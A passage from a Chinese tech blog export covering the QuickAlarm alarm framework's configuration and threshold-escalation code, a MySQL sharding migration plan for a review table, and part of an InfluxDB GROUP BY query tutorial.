异常报警升级测试18:36:28.998 [Thread-15] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 22 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-16] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 23 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [sms-sender1-thread-5] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 15 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-9] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 30 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [sms-sender1-thread-1] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 11 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-13] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 25 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-19] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 21 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-34] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 3 &gt;&gt;&gt; 异常报警升级测试18:36:29.010 [sms-sender1-thread-4] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com, erhui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 7 &gt;&gt;&gt; 异常报警升级测试18:36:29.010 [sms-sender1-thread-3] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 12 &gt;&gt;&gt; 异常报警升级测试18:36:29.011 [sms-sender1-thread-2] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 13 &gt;&gt;&gt; 异常报警升级测试18:36:29.014 [sms-sender1-thread-5] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com, erhui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 8 &gt;&gt;&gt; 异常报警升级测试18:36:29.014 [sms-sender1-thread-1] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 20 &gt;&gt;&gt; 异常报警升级测试 III. 报警规则加载自定义1. 实现IConfLoader接口自定义加载器，给了一个最基本的 12345678910111213141516171819202122232425262728293031323334public class SelfAlarmConfLoader implements IConfLoader { @Override public RegisterInfo getRegisterInfo() { RegisterInfo registerInfo = new RegisterInfo(); registerInfo.setMaxAlarmType(100); registerInfo.setDefaultAlarmUsers(\"yihui\"); registerInfo.setAppName(\"test\"); return registerInfo; } @Override public boolean alarmEnable() { return true; } @Override public int order() { return 0; } @Override public AlarmConfig getAlarmConfig(String alarmKey) { //db 查询，获取对应的配置信息 // 下面是模拟，返回一个固定的配置 AlarmConfig alarmConfig = new AlarmConfig(); alarmConfig.setAlarmLevel(\"WEIXIN\"); alarmConfig.setAutoIncEmergency(false); alarmConfig.setMinLimit(10); alarmConfig.setMaxLimit(14); alarmConfig.setUsers(Arrays.asList(\"yihui\")); alarmConfig.setAlarmThreshold(Collections.emptyList()); return alarmConfig; }} 2. 添加SPI配置在resources目录下新增 目录： META-INF/services 文件： com.hust.hui.alarm.core.loader.api.IConfLoader 文件内容 1com.hust.hui.alarm.core.test.loader.SelfAlarmConfLoader 3. 测试同样是上面的代码，输出结果 1234518:43:04.275 [sms-sender1-thread-2] INFO alarm - Do send msg by WEIXIN to user:[yihui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 10 &gt;&gt;&gt; 异常报警升级测试18:43:04.275 [sms-sender1-thread-4] INFO alarm - Do send msg by WEIXIN to user:[yihui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 12 &gt;&gt;&gt; 异常报警升级测试18:43:04.276 [sms-sender1-thread-1] INFO alarm - Do send msg by WEIXIN to user:[yihui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 11 &gt;&gt;&gt; 异常报警升级测试18:43:04.275 [sms-sender1-thread-5] INFO alarm - Do send msg by WEIXIN to user:[yihui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 14 &gt;&gt;&gt; 异常报警升级测试18:43:04.275 [sms-sender1-thread-3] INFO alarm - Do send msg by WEIXIN to user:[yihui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 13 &gt;&gt;&gt; 异常报警升级测试 4. 说明系统默认的order是10，所以如果在测试上面的第二步时，不妨把com.hust.hui.alarm.core.test.loader.SelfAlarmConfLoader#order返回值，改成大于10，这样就会走到默认的配置加载类 采用 SelfAlarmConfLoader 时，前面说的两个基础配置文件，是可以没有的，完全不会有任何影响，因为对应的注册类和报警规则，都是右这个类内部提供了 IV. 小结所有测试相关数据，均可以在测试工程中获取，请主要关注: 测试case 注册文件：alarmConfig 报警规则配置文件：alarm.properties V. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目: QuickAlarm 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2018/02/11/报警系统QuickAlarm使用手册/"},{"title":"7. 报警系统QuickAlarm之默认报警规则扩展","text":"本篇主要是扩展默认的报警规则，使其能更加友好的支持同时选择多种报警方式 扩展遵循两个原则 不影响原有的配置文件格式 简化规则解析复杂度 I. 配置文件的扩展先看一下原有的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748{ \"default\": { \"level\": \"NONE\", \"autoIncEmergency\": true, \"max\": 30, \"min\": 3, \"threshold\": [ { \"level\": \"LOG\", \"threshold\": 5, \"users\": [ \"yihui\", \"erhui\" ] } ], \"users\": [ \"yihui\" ] }, \"NPE,SELFDEFINE\": { \"level\": \"LOG\", \"autoIncEmergency\": false, \"max\": 30, \"min\": 0, \"threshold\": [ { \"level\": \"SMS\", \"threshold\": 20, \"users\": [ \"345345345345\", \"123123123123\" ] }, { \"level\": \"WEIXIN\", \"threshold\": 10, \"users\": [ \"小灰灰Blog\", \"greyBlog\" ] } ], \"users\": [ \"yihui\" ] }} 我们希望是能够支持多重报警方式同时选中，那么上面的配置中， threshold中只定义了一个阀值参数显然是不合适的，主要问题在于 单一阀值，不允许不同报警方式存在交叉 两个报警方式的threshold值相等时，选中的具体是哪个不可预期 所以我们的目标是将上面的参数中，新增一个指定上限的值max 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485{ \"default\": { \"level\": \"NONE\", \"autoIncEmergency\": true, \"max\": 30, \"min\": 3, \"threshold\": [ { \"level\": \"LOG\", \"threshold\": 5, \"users\": [ \"yihui\", \"erhui\" ] } ], \"users\": [ \"yihui\" ] }, \"NPE,SELFDEFINE\": { \"level\": \"LOG\", \"autoIncEmergency\": false, \"max\": 30, \"min\": 0, \"threshold\": [ { \"level\": \"SMS\", \"threshold\": 20, \"users\": [ \"345345345345\", \"123123123123\" ] }, { \"level\": \"WEIXIN\", \"threshold\": 10, \"users\": [ \"小灰灰Blog\", \"greyBlog\" ] } ], \"users\": [ \"yihui\" ] }, \"ZZZ\": { \"level\": \"LOG\", \"autoIncEmergency\": true, \"max\": 30, \"min\": 3, \"threshold\": [ { \"level\": \"SMS\", \"threshold\": 20, \"max\": 27, \"users\": [ \"345345345345\", \"123123123123\" ] }, { \"level\": \"WEIXIN\", \"threshold\": 10, \"users\": [ \"yihui\", \"erhui\" ] }, { \"level\": \"EMAIL\", \"threshold\": 9, \"max\": 14, \"users\": [ \"yihui@xxx.com\", \"erhui@xxx.com\" ] } ], \"users\": [ \"yihui@xxx.com\" ] }} 向上面这般改动之后，相当于每个报警方式都可以定义自己的区间，因此允许多重报警方式存在区间的交叉，计数在交叉区间即表示选中这多重方式 II. 扩展的实现支持从配置文件的变动来看，改动很小，只是新增一个参数而已，且这个参数不是必填的，那么对应的do应该为 123456789101112131415161718192021222324public class BasicAlarmThreshold { private String level; /** * 启用定义的报警方式的阀值下限， * * 当报警计数 count &gt;= min * - max 非null, count &lt; max 则选择本报警方式; * count &gt;= max 则不选择本报警方式 * - max 为null（即表示为定义时）， * 则max赋值为:恰好大于 min 的 {@link BasicAlarmThreshold#threshold}值 * */ private int threshold; /** * 报警上限值，注意这是包装类型，允许为null */ private Integer max; private List&lt;String&gt; users;} 然后顺带着，优化一把我们的映射规则，将配置规则的DO对象，映射为业务对象 主要的映射规则如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990/** * 将配置项转换为业务DO对象, 会做一些兼容, 保证 level. min, max, users, thresholds 都不会为null * * @param basicAlarmConfig * @return */private static AlarmConfig parse2BizConfig(BasicAlarmConfig basicAlarmConfig) { if (basicAlarmConfig.getUsers() == null || basicAlarmConfig.getUsers().isEmpty()) { // 如果没有填写用户, 则直接抛弃 return null; } AlarmConfig alarmConfig = new AlarmConfig(); // 如果配置的报警类型是异常的, 则下面会兼容一把，设置为 NONE, 避免因为配置的原因导致系统异常 alarmConfig.setExecutor(SimpleExecuteFactory.getExecute(basicAlarmConfig.getLevel())); alarmConfig.setAutoIncEmergency(basicAlarmConfig.isAutoIncEmergency()); // 报警用户, 要求用户必须存在 alarmConfig.setUsers(basicAlarmConfig.getUsers()); // 报警上限, 如果用户没有填写，采用默认的（因为短信报警按条数要钱, 没必要一直无上限的报） alarmConfig.setMaxLimit(basicAlarmConfig.getMax() == null ? AlarmConfig.DEFAULT_MAX_NUM : basicAlarmConfig.getMax()); // 报警下限, 如果用户没有填写, 采用默认的最小值0 alarmConfig.setMinLimit(basicAlarmConfig.getMin() == null ? AlarmConfig.DEFAULT_MIN_NUM : basicAlarmConfig.getMin()); // 获取配置中的阀值列表，并排序 List&lt;BasicAlarmThreshold&gt; basicAlarmThresholdList = basicAlarmConfig.getThreshold(); if(basicAlarmThresholdList == null) { basicAlarmThresholdList = Collections.emptyList(); } basicAlarmThresholdList.sort(Comparator.comparingInt(BasicAlarmThreshold::getThreshold)); List&lt;AlarmThreshold&gt; alarmThresholdList = new ArrayList&lt;&gt;(basicAlarmThresholdList.size() + 2); AlarmThreshold tmpAlarmThreshold; BasicAlarmThreshold tmpBasicAlarmThreshold; boolean containDefaultExecute = false; for (int i = 0; i &lt; basicAlarmThresholdList.size(); i++) { tmpBasicAlarmThreshold = basicAlarmThresholdList.get(i); tmpAlarmThreshold = new AlarmThreshold(); tmpAlarmThreshold.setExecutor(SimpleExecuteFactory.getExecute(tmpBasicAlarmThreshold.getLevel())); tmpAlarmThreshold.setUsers(tmpBasicAlarmThreshold.getUsers()); tmpAlarmThreshold.setMin(tmpBasicAlarmThreshold.getThreshold()); if (tmpBasicAlarmThreshold.getMax() == null || tmpBasicAlarmThreshold.getMax() &lt;= tmpBasicAlarmThreshold.getThreshold()) { if (i == basicAlarmThresholdList.size() - 1) { // 最后一个，则使用默认的上限阀值 tmpAlarmThreshold.setMax(alarmConfig.getMaxLimit()); } else { tmpAlarmThreshold.setMax(basicAlarmThresholdList.get(i + 1).getThreshold()); } } else { tmpAlarmThreshold.setMax(tmpBasicAlarmThreshold.getMax()); } if (!containDefaultExecute) { containDefaultExecute = tmpBasicAlarmThreshold.getLevel().equals(basicAlarmConfig.getLevel()); } alarmThresholdList.add(tmpAlarmThreshold); } int thresholdSize = alarmThresholdList.size(); if (thresholdSize == 0) { // 没有配置阀值列表，直接使用默认 tmpAlarmThreshold = new AlarmThreshold(); tmpAlarmThreshold.setExecutor(alarmConfig.getExecutor()); tmpAlarmThreshold.setUsers(alarmConfig.getUsers()); tmpAlarmThreshold.setMin(alarmConfig.getMinLimit()); tmpAlarmThreshold.setMax(alarmConfig.getMaxLimit()); alarmThresholdList.add(tmpAlarmThreshold); } else if (!containDefaultExecute) { // 不包含时默认时，补全 tmpAlarmThreshold = new AlarmThreshold(); tmpAlarmThreshold.setExecutor(alarmConfig.getExecutor()); tmpAlarmThreshold.setUsers(alarmConfig.getUsers()); tmpAlarmThreshold.setMin(alarmConfig.getMinLimit()); tmpAlarmThreshold.setMax(alarmThresholdList.get(0).getMin()); alarmThresholdList.add(0, tmpAlarmThreshold); if (alarmThresholdList.get(thresholdSize).getMax() &lt; alarmConfig.getMaxLimit()) { tmpAlarmThreshold = new AlarmThreshold(); tmpAlarmThreshold.setExecutor(alarmConfig.getExecutor()); tmpAlarmThreshold.setUsers(alarmConfig.getUsers()); tmpAlarmThreshold.setMin(alarmThresholdList.get(thresholdSize).getMax()); tmpAlarmThreshold.setMax(alarmConfig.getMaxLimit()); alarmThresholdList.add(tmpAlarmThreshold); } } alarmConfig.setAlarmThreshold(alarmThresholdList); return alarmConfig;} 在映射为业务对象的逻辑中，直接保障了AlarmThreshold列表中的顺序为最终的需求顺序，映射规则为 123456789101112131415161718192021222324252627/** * 如果配置的basicAlarmThresholdList列表中包含默认的报警方式 * - 则报警方式完全按照basicAlarmThresholdList的定义来 * - eg: 默认报警为 Log, min=5, max=30 * - basicAlarmThresholdList 中定义为 : { Log, min=6 }, { Email, min=8 }, { WeiXin, min=10, max=16 }, { SMS, min=14, max=26 } * - 则转换后的 alarmThresholdList为: * - { Log, min=6, max=8 }, { Email, min=8, max=10 }, { WeiXin, min=10, max=16 }, { SMS, min=14, max=26 } * - count : [6, 8) Log * - count : [8, 10) Email * - count : [10, 16) WeiXin * - count : [14, 26) SMS * * 如果不包含默认报警方式 * - 则需要补全最外层定义的Min-Max区间中的空余位 * - eg: 默认报警为 Log, min=5, max=30 * - basicAlarmThresholdList 中定义为 : { Email, min=8 }, { WeiXin, min=10, max=16 }, { SMS, min=14, max=26 } * - 则转换后的 alarmThresholdList为: * - { Log, min=5, max=8 }, { Email, min=8, max=10 }, { WeiXin, min=10, max=16 }, { SMS, min=14, max=26 }, { Log, min=26, max=30 } * - count : [5, 8) Log * - count : [8, 10) Email * - count : [10, 16) WeiXin * - count : [14, 26) SMS * - count : [26, 30) Log * * * 上面改造后，很容易得知，支持多重报警方式同时工作，即当技术为14，15 时，同时发起WeiXin和SMS报警 */ 相应的就可以干掉原来不太好懂的Executor选择逻辑，对应的代码为 123456789101112131415161718192021222324252627282930// com.hust.hui.alarm.core.execut.AlarmExecuteSelector#getExecutepublic static List&lt;ExecuteHelper&gt; getExecute(final AlarmConfig alarmConfig, int count) { // 未达到报警的下限 or 超过报警的上限时 if (count &lt; alarmConfig.getMinLimit() || count &gt; alarmConfig.getMaxLimit()) { return Collections.singletonList(new ExecuteHelper(SimpleExecuteFactory.getExecute(NoneExecute.NAME), alarmConfig.getUsers())); } // 未开启报警升级, 直接返回 if (!alarmConfig.isAutoIncEmergency()) { return Collections.singletonList(new ExecuteHelper(alarmConfig.getExecutor(), alarmConfig.getUsers())); } if (count &lt; alarmConfig.getAlarmThreshold().get(0).getMin()) { // 未达到报警的下限 return Collections.singletonList(new ExecuteHelper(SimpleExecuteFactory.getExecute(NoneExecute.NAME), alarmConfig.getUsers())); } List&lt;ExecuteHelper&gt; list = new ArrayList&lt;&gt;(); for(AlarmThreshold alarmThreshold: alarmConfig.getAlarmThreshold()) { if (alarmThreshold.getMin() &lt;= count &amp;&amp; count &lt; alarmThreshold.getMax()) { list.add(new ExecuteHelper(alarmThreshold.getExecutor(), alarmThreshold.getUsers())); } if(alarmThreshold.getMin() &gt; count) { break; } } return list;} III. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目: QuickAlarm 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2018/03/05/报警系统QuickAlarm之默认报警规则扩展/"},{"title":"生产环境分库分表的实际操作全记录","text":"一次分库分表全过程记录实际操刀过一次线上的分库分表，距离现在时间有点久了，现在想一想，发现还是有不少有意思的东西，所以来一个迟到的记录 I. 背景分析当时主要负责商品评价这一块业务，评价信息单表存储，主要包括一些基本的评价信息，商品id，订单id，买家id和卖家id，当时DB量级已经在3-4亿了，经常出现一些慢SQL，考虑到量级的问题，所以着手分库分表 1. 分库分表首先知道分库分表一般有两种方式，水平划分和垂直划分 在具体划分，可如下 垂直分表：将大表拆分成小表，将表中一些不常用的信息拆分出去，避免跨页查询 垂直分库：根据不同的业务进行划分，每个业务有自己独立的数据库，如商品有商品库，用户有用户库，店铺有店铺库，db与db之间物理or逻辑分离 水平分表：根据表中某些数据行，定义某种映射规则，将不同的数据行分布到不同的表中（表的结构基本不变） 水平分库分表：将水平分表拆分出来的分表，放入不同的库中 2. 业务场景分析根据上面分库分表的理解，很容易得出一个期待的结果 独立的评价库，这个库里面只保存评价相关的信息 采用水平分表，将原表的数据，拆分到1024(这个分表数量可自定义)张分表中（如果拆分的较合理，则单表数据量在30-40w） 那么一个问题就是如何进行水平拆分了，而考虑这一点，则需要根据实际的场景出发，分析sql的case 商品详情的评价查询：根据商品ID进行查询 卖家管理端查询所有评价：根据卖家ID进行查询 买家评价管理：根据买家ID进行查询 订单列表的评价信息：根据订单ID进行查询 粗略可以设定两种分表方案： 方案一：上面四种场景，显然是根据商品ID查询的量最大（因为详情的流量最大），如果根据商品ID进行分表，那么一个商品的评价都在落在一个分表中，此时查询不会出现夸表，但是另外三中查询则会导致跨表；同样换成卖家ID则会导致其他三个查询会跨表 第二种方式，建立一张附表，只保存如下信息 12345rateId: 评价IDitemId: 商品IDsellerId: 卖家IDbuyerId: 买家IDorderId: 订单ID 然后根据rateId进行分库分表，这样每次查询时，先通过附表，查询到对应的评价ID，然后拿rateId到分表去获取评价信息 3. 基本信息在实际的操作之前，先给出当时的表信息（说明，数据库和表名和表结构为本文定义，与实际有差异） define desc 数据库 mysql 存储引擎 innorDB 库名 rate 表名 ItemRate 量级 3-4亿 binlog 开启binlog消息，有下游业务方通过mq方式消费db的变更 表结构类似下表，干掉了很多与主题无关的信息 12345678910111213CREATE TABLE `ItemRate` ( `id` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;评价id&apos;, `orderId` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;订单id&apos;, `buyerId` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;买家ID&apos;, `sellerId` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;卖家ID&apos;, `itemId` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;商品ID&apos;, `comment` varchar(1000) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;评价内容&apos;, `imgUrls` varchar(500) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;上传的图片&apos;, `created` int(11) unsigned NOT NULL DEFAULT &apos;0&apos;, `updated` int(11) unsigned NOT NULL DEFAULT &apos;0&apos;, `info` tinyint(4) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;其他信息，省略...&apos;, PRIMARY KEY `id` (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 COMMENT=&apos;评价表&apos;; II. 设计&amp;实现在实际操作之前，首先是选择如何分库分表的方案了，其次就是整个操作的步骤规划，当这两个搞定之后，在开始编码实现才是比较合适的 首先确定分4库1024张表 （组内大神的建议，合理分表规则后单表量级在10w级别，业务没有大变化时，短期内将无序再次分表） 1. 方案设计前面业务场景的分析中，就给出了两种方式，一个是根据商品ID进行分表，一个是建立一个附表然后根据rateId进行分表，首先是分表规则，我们选择最简单的方式，根据id % 1024进行取模 接下来分析下两种的优劣 a. itemID分表方案优点： 相比与下一种而言，实现简单，无需附表，也不用考虑数据不一致问题 可以支持详情评价列表复杂的排序逻辑（当时排序方案不是离线计算的，走的DB的排序方式） 性能更优，少了一张附表的过渡 缺点： 非itemId查询会跨表 hash不均，导致单表量较多（比如可能出现某些爆款商品就有几十万的评价） b. rateId分表方案优点： 支持前面的几种查询场景，不过需要先查询出rateId 单表数据量分布均匀 缺点： 复杂的查询条件支持不友好，特别是排序，过滤等依赖到一些评价信息的场景 插入和更新时，都需要同步更新附表，这个保证复杂性更高（即要满足多表的事务，需要自己实现失败回滚） 每次查询都需要先通过附表查询rateIds，效率更低（公司内的数据库中间件不允许join查询） c. 方案选择通过实际分析，选择了根据itemId进行分表的方案，理由如下： 业务逻辑简单，后续维护也方便 线上的sql中，95%以上都是根据itemId进行查询 上层有一层根据solr的搜索，因此根据buyerId,sellerId,orderId 可以走搜索，不需进行db的多表联合查询，且性能ok 附表虽然结构简单，但是单表最终的数据量依然可能很大，在亿级已上性能怎样也不好保证 因此，最终选择的方式是： 1234567db ： Rate000 ~ Rate003, table ： ItemRate0000 ~ ItemRaet1023其中映射规则：tableIndex = itemId % 1024 ---&gt; 分表名 如 ItemRate0122dbIndex = itemId % 1024 / 256 ---&gt; 分库名 如 Rate001 2. 步骤计划整个迁移的步骤，有两种方式，一个是双写方案： 方案一：采用双写 创建DB 服务的sql改造，主要是所有的sql，都要有一个新的分库分表的方式 线上开始双写（即新增一条评价时，即写入就得表，也写入新的表） 全量将旧表数据导入到新表数据 线上读流量切换到新表，验证是否有问题 所有关注旧表binlog的业务，全部迁移到关注新表的binlog（这里需要dba支持，因为新表有1024张，不可能关注1024个topic，这里需要dba提供binlog的整合，不在本文重点，此处略过） 关闭双写，所有写直接切到新表 删除旧代码 方案二：基于db的binlog实现的异步同步方式 创建DB 服务的sql改造，主要是所有的sql，都要有一个新的分库分表的方式 开启增量，将某个时刻开始之后所有更新的数据，通过异步方式增量同步到新表 开始全量，将之前的数据全部导入到新表 线上读切新表，验证服务是否有问题 所有关注旧表binlog业务，全部迁移到关注新表binlog 线上切写到新表 增量完毕后，关闭增量 删除旧代码 两种方案本质上没有太大的区别，其中第一种双写，需要自己来保障双写成功；而后面增量的方式，一般DBA这边会有较好的方案来实现增量同步 额外说一点, 在实际的场景中，推动接听旧表binlog的业务方迁移是一件不可控的操作（因为啥原因大家都懂得），所以当时实际的情况是切到新表后，还会进行反向同步，即将新表的数据又重新的写入到旧表中，因此这种场景要求方案二中，切写到新表时，需要先停写一段时间，等待增量同步完毕之后，关闭增量，然后开启反向同步脚本，然后再切写 因为停写，对业务会有影响，所以当时采取第一种方案，因为反向同步不再本文重点，所以如果不考虑反向同步的情况，上面两种方式没有什么区别 3. 注意事项 全量迁移，如果dba没有提供相关工具的话，就只能自己写了，当时是找了一台机器，部署了个服务利用jdbcTemplate来扫表，实现全量数据插入 双写时，需要注意，如果双写失败应该怎么办 数据对账比较有必要 III. 小结1. 分库分表 一般而言，当量级达到qw时，就该考虑分库分表了，不同的业务有自己独立的库 根据表中某些列进行分表，将大表数据拆分到分表中 大表拆分为小表 2. 一般实现步骤 创建DB 服务的sql改造，主要是所有的sql，都要有一个新的分库分表的方式 线上开始双写 全量将旧表数据导入到新表数据 线上读流量切换到新表，验证是否有问题 关闭双写，所有写直接切到新表 删除旧代码 IV. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/13/生产环境分库分表的实际操作全记录/"},{"title":"190814-Influx Sql系列教程九：query数据查询基本篇二","text":"前面一篇介绍了influxdb中基本的查询操作，在结尾处提到了如果我们希望对查询的结果进行分组，排序，分页时，应该怎么操作，接下来我们看一下上面几个场景的支持 在开始本文之前，建议先阅读上篇博文: 190813-Influx Sql系列教程八：query数据查询基本篇 0. 数据准备在开始查询之前，先看一下我们准备的数据，其中name,phone为tag, age,blog,id为field 1234567891011121314&gt; select * from yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰21563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110&gt; show tag keys from yhhname: yhhtagKey------namephone 1. 分组查询和sql语法一样，influxdb sql的分组也是使用group by语句，其定义如下 1SELECT_clause FROM_clause [WHERE_clause] GROUP BY [* | &lt;tag_key&gt;[,&lt;tag_key]] a. group by tag从上面的定义中，有一点需要特别强调，用来分组的必须是tag，也就是说对于influxdb而言，不支持根据field进行分组 一个实际的演示如下: 1234567891011121314&gt; select * from yhh group by phonename: yhhtags: phone=time age blog id name---- --- ---- -- ----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰2name: yhhtags: phone=110time age blog id name---- --- ---- -- ----1563889723440000821 30 http://blog.hhui.top 11 一灰灰3 注意上面的输出结果，比较有意思，分成了两个结构段落，且可以输出完整的数据；而mysql的分组查询条件中一般需要带上分组key，然后实现一些数据上的聚合查询 如果我的分组中，使用field进行分组查询，会怎样？报错么? 123456789&gt; select * from yhh group by agename: yhhtags: age=time age blog id name phone---- --- ---- -- ---- -----1563889538654374538 26 http://blog.hhui.top 10 一灰灰1563889547738266214 30 http://blog.hhui.top 11 一灰灰1563889704754695002 30 http://blog.hhui.top 11 一灰灰21563889723440000821 30 http://blog.hhui.top 11 一灰灰3 110 从上面的case中可以看出，虽然执行了，但是返回的结果并不是我们预期的。 b. group by *另外一个与一般SQL语法不一样的是group by 后面可以跟上*，表示根据所有的tag进行分组，一个测试如下 1234567891011121314151617181920&gt; select * from yhh group by *name: yhhtags: name=一灰灰, phone=time age blog id---- --- ---- --1563889538654374538 26 http://blog.hhui.top 101563889547738266214 30 http://blog.hhui.top 11name: yhhtags: name=一灰灰2, phone=time age blog id---- --- ---- --1563889704754695002 30 http://blog.hhui.top 11name: yhhtags: name=一灰灰3, phone=110time age blog id---- --- ---- --1563889723440000821 30 http://blog.hhui.top 11&gt; c. group by time除了上面的根据tag进行分组之外，还有一个更高级的特性，根据时间来分组，这个时间还支持一些简单的函数操作 定义如下 1SELECT &lt;function&gt;(&lt;field_key&gt;) FROM_clause WHERE &lt;time_range&gt; GROUP BY time(&lt;time_interval&gt;),[tag_key] [fill(&lt;fill_option&gt;)] 我们知道influxdb的一个重要应用场景就是监控的记录，在监控面板上经常会有的就是根据时间进行聚合，比如查询某个服务每分钟的异常数，qps, rt等 下面给出一个简单的使用case 123456789101112131415161718# 为了显示方便，将数据的时间戳改成日期方式展示&gt; precision rfc3339&gt; select * from yhhname: yhhtime age blog id name phone---- --- ---- -- ---- -----2019-07-23T13:45:38.654374538Z 26 http://blog.hhui.top 10 一灰灰2019-07-23T13:45:47.738266214Z 30 http://blog.hhui.top 11 一灰灰2019-07-23T13:48:24.754695002Z 30 http://blog.hhui.top 11 一灰灰22019-07-23T13:48:43.440000821Z 30 http://blog.hhui.top 11 一灰灰3 110&gt; select count(*) from yhh where time&gt;'2019-07-23T13:44:38.654374538Z' and time&lt;'2019-07-23T13:50:43.440000821Z' GROUP BY time(2m)name: yhhtime count_age count_blog count_id---- --------- ---------- --------2019-07-23T13:44:00Z 2 2 22019-07-23T13:46:00Z 0 0 02019-07-23T13:48:00Z 2 2 22019-07-23T13:50:00Z 0 0 0 在上面的查询语句中，有几个地方需要说明一下 select后面跟上的是单个or多个field的聚合操作，根据时间进行分组时，不允许查询具体的field值，否则会有下面的错误提示 12&gt; select * from yhh where time&gt;'2019-07-23T13:44:38.654374538Z' and time&lt;'2019-07-23T13:50:43.440000821Z' GROUP BY time(2m)ERR: GROUP BY requires at least one aggregate function where条件限定查询的时间范围，否则会得到很多数据 group by 